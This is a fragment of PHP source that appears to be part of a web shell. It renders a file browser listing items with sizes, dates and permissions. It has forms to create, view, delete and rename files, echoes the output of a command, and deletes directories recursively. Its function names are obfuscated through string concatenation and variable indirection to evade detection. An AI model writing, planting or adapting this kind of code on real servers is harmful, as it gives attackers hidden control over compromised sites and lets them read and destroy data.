<td><center>Create Folder<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
<input type="text" name="folder_name" placeholder="Folder Name"><input type="submit" value="Create Folder"></form><center></td>
<td><center>Create File<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
<input type="text" name="file_name" placeholder="File Name"><input type="submit" value="Create File"></form></td></tr>
</tbody></table>';
echo $viewCommandResult;
echo '<table border=1>';
echo '<br><tr><th><center>Item Name</th><th><center>Size</th><th><center>Date</th><th>Permissions</th><th><center>View</th><th><center>Delete</th><th><center>Rename</th></tr></center></center></center>';
foreach ($scd($currentDirectory) as $v) {
    $u = $ril($v);
    $s = $st($u);
    $itemLink = $isdir($v) ? '?d=' . x($currentDirectory . '/' . $v) : '?'.('d='.x($currentDirectory).'&f='.x($v));
    $permission = substr(sprintf('%o', fileperms($u)), -4);
    $writable = $isw($u);
    echo '<tr>
            <td class="item-name"><a href="'.$itemLink.'">'.$v.'</a></td>
            <td class="size">'.filesize($u).'</td>
            <td class="date" style="text-align: center;">'.date('Y-m-d H:i:s', filemtime($u)).'</td>
            <td class="permission '.($writable ? 'writable' : 'not-writable').'">'.$permission.'</td>
            <td><center><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="view_file" value="'.$htm($v).'"><input type="submit" value=" View "></form></center></td>
            <td><center><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="delete_file" value="'.$htm($v).'"><input type="submit" value="Delete"></form></center></td>
            <td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="old_name" value="'.$htm($v).'"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
        </tr>';
        
}

echo '</table>';
function deleteDirectory($dir) {
   $unl = "u"."n"."l"."i"."n"."k";
    if (!file_exists($dir)) {
        return true;
    }
    if (!is_dir($dir)) {
        return $unl($dir);
    }
    $scd = "s"."c"."a"."n"."d"."i"."r";
    foreach ($scd($dir) as $item) {
        if ($item == '.' || $item == '..') {
            continue;
        }
        if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
            return false;
        }
    }
    return rmdir($dir);
}
